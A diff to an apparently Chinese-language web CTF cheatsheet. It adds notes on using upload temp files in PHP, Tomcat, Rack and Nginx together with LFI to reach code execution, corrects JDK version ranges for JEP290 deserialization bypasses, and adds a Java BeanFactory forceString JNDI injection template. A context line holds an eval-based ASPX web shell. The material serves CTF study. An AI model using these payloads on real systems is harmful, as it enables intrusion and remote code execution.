@@ -2501,6 +2501,27 @@ Content-Type: <%@ Page Language="JScript"%><%eval(Request.Item["x"],"unsafe");%>
 --x--
 ```
 
+## 暫存檔案
+
+- PHP
+    - PHP 在上傳時，會在臨時目錄下生成臨時文件
+    - Linux: `phpXXXXXX`
+    - Windows: `phpXXXXXX.tmp`
+    - 可以透過 phpinfo 取得暫存檔名，並結合 LFI 達到 RCE: [reference](https://github.com/w181496/Web-CTF-Cheatsheet#phpinfo)
+- Tomcat
+    - `curl http://127.0.0.1:8080/ -H "Cookie: JSESSIONID=910666EC33F0B928D05C3C277397DBC5" --limit-rate 1K -F "files=@payload" -X GET`
+    - `/tmp/tomcat.8080.15601954988790012368/work/Tomcat/localhost/ROOT`
+    - Example: 
+        - RealWorld CTF 2024 - chatterbox
+- Rack
+    - `curl -F file=@hello.txt http://127.0.0.1:3000/`
+    - 會暫存目錄，生成 `RackMultipart20250103-1-sc3f98.txt` (6 bytes 隨機)
+    - Example
+        - [SekaiCTF 2023 - Scanner Service](https://blog.huli.tw/2023/09/02/corctf-sekaictf-2023-writeup/#scanner-service-146-solves)
+- Nginx Buffering
+    - https://github.com/w181496/Web-CTF-Cheatsheet#nginx-buffering
+- 通常都可以透過 `/proc/self/fd/xxx` link 到暫存檔案
+
 ## 其他
 
 - 常見場景：配合文件解析漏洞
@@ -2851,9 +2872,9 @@ print marshalled
             - 可以探測 RMI endpoint
             - 工具: BaRMIe
         - `lookup`
-            - ~8u121: 直接打反序列化
-            - 8u121 ~ 8u232: UnicastRef + JRMPListener (JEP290 Bypass)
-            - 8u232 ~ 8u242: UnicastRefRemoteObject + JRMPListener (JEP290 Bypass)
+            - version < 8u121: 直接打反序列化
+            - 8u121 <= version < 8u231: UnicastRef + JRMPListener (JEP290 Bypass)
+            - 8u231 <= version < 8u241: UnicastRefRemoteObject + JRMPListener (JEP290 Bypass)
         - `bind`/`unbind`/`rebind`
             - 8u141 前，先反序列化才檢查來源，可強制反序列化
                 - ~8u121: 直接 bind/rebind 反序列化
@@ -2911,6 +2932,12 @@ print marshalled
             - 常配合 `ELProcessor` or `GroovyShell` 來 RCE
             - 限制
                 - `forceString` 在 Tomcat 9.0.63 後被移除 ([ref](https://github.com/apache/tomcat/commit/df7da6c29aace17c92fe47fe386ab14ece59b5d4))
+            - Template
+            ```java
+            ResourceRef ref = new ResourceRef(RESOURCECLASS , null, "", "", true, FACTORY, null);
+            ref.add(new StringRefAddr("forceString", "x=FUNC_NAME"));
+            ref.add(new StringRefAddr("x",VALUE));
+            ```
         - `javax.el.ELProcessor`
             - `eval` 剛好吃一個字串參數，常配合 BeanFactory 來 RCE
             - 限制
